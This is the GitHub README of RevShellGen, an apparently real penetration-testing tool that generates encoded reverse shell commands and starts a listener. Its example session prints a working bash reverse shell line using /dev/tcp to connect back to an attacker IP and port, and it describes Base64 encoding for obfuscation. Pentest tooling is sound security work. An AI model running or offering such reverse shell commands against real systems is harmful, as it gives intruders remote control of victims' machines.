<div align="center">

# 🚀 RevShellGen

**Reverse Shell Generator**

[![Python](https://img.shields.io/badge/Python-3.6%2B-blue?style=for-the-badge&logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-GPL%20v3-green?style=for-the-badge)](https://github.com/t0thkr1s/revshellgen/blob/master/LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-orange?style=for-the-badge)](https://github.com/t0thkr1s/revshellgen)
[![Stars](https://img.shields.io/github/stars/t0thkr1s/revshellgen?style=for-the-badge)](https://github.com/t0thkr1s/revshellgen/stargazers)

[![CI Tests](https://github.com/t0thkr1s/revshellgen/workflows/CI%20Tests/badge.svg)](https://github.com/t0thkr1s/revshellgen/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/revshellgen?style=flat-square)](https://pypi.org/project/revshellgen/)
[![Downloads](https://img.shields.io/pypi/dm/revshellgen?style=flat-square)](https://pypi.org/project/revshellgen/)

<p align="center">
  <b>Automate reverse shell generation with style</b><br>
  <i>Generate, encode, and catch reverse shells without the hassle</i>
</p>

---

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Shell Types](#-supported-shells) • [Contributing](#-contributing)

</div>

## 📖 About

**RevShellGen** is a powerful command-line tool that simplifies the process of generating reverse shell commands. No more looking up syntax, no more manual encoding, no more configuration headaches. This tool handles it all with an intuitive interface.

### 🎯 Key Features

- 🖥️ **Interactive CLI** - User-friendly menu-driven interface
- 🔄 **Automatic encoding** - URL and Base64 encoding support
- 📋 **Clipboard integration** - Auto-copy generated commands
- 🌐 **Network detection** - Automatic IP address discovery
- 🎨 **Multiple shell types** - Bash, Python, Netcat, PowerShell, and more
- 🔊 **Built-in listener** - Automatic netcat/ncat listener setup
- 🍎 **Cross-platform** - Full support for Linux and macOS
- 📚 **TTY upgrade guide** - Comprehensive instructions for shell upgrades

## 🚀 Quick Start

### Option 1: Install from PyPI (Coming Soon)
```bash
# Install from PyPI
pip install revshellgen

# Run the tool
revshellgen
```

### Option 2: Install from Source
```bash
# Clone the repository
git clone https://github.com/t0thkr1s/revshellgen
cd revshellgen

# Install dependencies
pip3 install -r requirements.txt

# Run the tool
python3 revshellgen.py  # or python3 revshellgen_cli.py
```

## 📦 Installation

### Prerequisites

- Python 3.6 or higher
- pip (Python package manager)

### Dependencies

RevShellGen requires the following Python packages:

| Package | Purpose |
|---------|----------|
| [`pyperclip`](https://pypi.org/project/pyperclip/) | Clipboard operations |
| [`colorama`](https://pypi.org/project/colorama/) | Terminal colors |
| [`readchar`](https://pypi.org/project/readchar/) | Interactive key input |
| [`netifaces`](https://pypi.org/project/netifaces/) | Network interface detection |

### Installation Methods

<details>
<summary><b>Method 1: Using requirements.txt (Simplest)</b></summary>

```bash
git clone https://github.com/t0thkr1s/revshellgen
cd revshellgen
pip3 install -r requirements.txt
```
</details>

<details>
<summary><b>Method 2: Using setup.py (Traditional)</b></summary>

```bash
git clone https://github.com/t0thkr1s/revshellgen
cd revshellgen
python3 setup.py install
```
</details>

<details>
<summary><b>Method 3: Virtual environment (Recommended for isolation)</b></summary>

```bash
git clone https://github.com/t0thkr1s/revshellgen
cd revshellgen
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip3 install -r requirements.txt
```
</details>

<details>
<summary><b>Method 4: Manual installation</b></summary>

```bash
git clone https://github.com/t0thkr1s/revshellgen
cd revshellgen
pip3 install pyperclip colorama readchar netifaces
```
</details>

<details>
<summary><b>Method 5: User installation (no sudo required)</b></summary>

```bash
git clone https://github.com/t0thkr1s/revshellgen
cd revshellgen
pip3 install --user -r requirements.txt
```
</details>

### Platform-Specific Notes

#### 🐧 Linux
```bash
# You may need to install python3-dev
sudo apt-get install python3-dev  # Debian/Ubuntu
sudo yum install python3-devel     # RHEL/CentOS
```

#### 🍎 macOS
```bash
# Install ncat for better listener support
brew install nmap  # Includes ncat
```

## 💻 Usage

### Basic Workflow

1. **Start the tool**
   ```bash
   python3 revshellgen.py
   ```

2. **Configure your reverse shell**
   - Select your IP address (auto-detected)
   - Choose a port (e.g., 4444, 9001)
   - Select shell type (bash, python, etc.)
   - Choose encoding (none, URL, Base64)

3. **Generated command is automatically copied to clipboard**

4. **Start the listener** (automatic)

5. **Execute the command on the target machine**

### 📸 Screenshots

<div align="center">
<table>
  <tr>
    <td align="center">
      <img src="https://i.imgur.com/OBWE1KA.png" width="400"/><br>
      <b>Shell Selection</b>
    </td>
    <td align="center">
      <img src="https://i.imgur.com/xJZ1sHB.png" width="400"/><br>
      <b>Command Generation</b>
    </td>
  </tr>
</table>
</div>

## 🐚 Supported Shells

| Shell Type | Description | Platform |
|------------|-------------|----------|
| **Bash** | Bash TCP reverse shell | Linux/Unix |
| **Python** | Python-based reverse shell | Cross-platform |
| **Netcat** | Traditional nc reverse shell | Linux/Unix |
| **Netcat mkfifo** | Netcat with named pipe | Linux/Unix |
| **Perl** | Perl-based reverse shell | Cross-platform |
| **PHP** | PHP reverse shell | Cross-platform |
| **Ruby** | Ruby-based reverse shell | Cross-platform |
| **Java** | Java reverse shell | Cross-platform |
| **Telnet** | Telnet reverse shell | Linux/Unix |
| **PowerShell** | Windows PowerShell | Windows |

## 🔧 Advanced Features

### TTY Shell Upgrade

RevShellGen now includes comprehensive TTY upgrade instructions. After catching a shell, the tool provides:

- Step-by-step PTY spawn methods
- Terminal size detection and configuration
- Multiple upgrade techniques for different environments
- Troubleshooting tips for common issues
- Quick reference commands

### Encoding Options

- **None** - Raw command output
- **URL Encode** - For web application exploitation
- **Base64** - For command obfuscation

### Listener Options

The tool automatically detects and uses the appropriate netcat variant:
- `ncat` (preferred, from nmap package)
- `nc` (traditional netcat)
- macOS-specific `nc` syntax support

## 📝 Example Session

```
$ python3 revshellgen.py

                         __         __   __                  
  ____ ___  _  __  ___  / /  ___   / /  / /  ___ _ ___   ___ 
 / __// -_)| |/ / (_-< / _ \/ -_) / /  / /  / _ `// -_) / _ \
/_/   \__/ |___/ /___//_//_\__/ /_/  /_/   \_, / \__/ /_//_/
                                           /___/

---------- [ SELECT IP ] ----------
[ x ] 192.168.1.10 on eth0
[   ] 10.0.0.5 on tun0
[   ] Specify manually

---------- [ SPECIFY PORT ] ----------
[ # ] Enter port number : 4444

---------- [ SELECT COMMAND ] ----------
[ x ] unix_bash
[   ] unix_python
[   ] unix_nc_mkfifo
...

---------- [ REVERSE SHELL COMMAND ] ----------
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1

[ + ] Command copied to clipboard!
[ + ] Starting listener on port 4444...
```

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.

### Development Setup

```bash
# Clone your fork
git clone https://github.com/YOUR_USERNAME/revshellgen
cd revshellgen

# Create a branch
git checkout -b feature/your-feature-name

# Make your changes and commit
git add .
git commit -m "Add your feature"

# Push to your fork
git push origin feature/your-feature-name

# Create a Pull Request
```

## 🐛 Issues & Support

Found a bug or have a suggestion? Please [open an issue](https://github.com/t0thkr1s/revshellgen/issues) on GitHub.

## 📜 License

This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

> **This tool is intended for authorized penetration testing and educational purposes only.**
> 
> The use of this tool against systems you do not own or have explicit permission to test is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

## 🙏 Acknowledgments

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Reverse shell references
- [ropnop](https://blog.ropnop.com/) - TTY upgrade techniques
- [PentestMonkey](http://pentestmonkey.net/) - Reverse shell cheat sheet
- All contributors and users of this tool

---

<div align="center">
  <b>Made with ❤️ by <a href="https://github.com/t0thkr1s">t0thkr1s</a></b><br>
  <i>Star ⭐ this repository if you find it useful!</i>
</div>
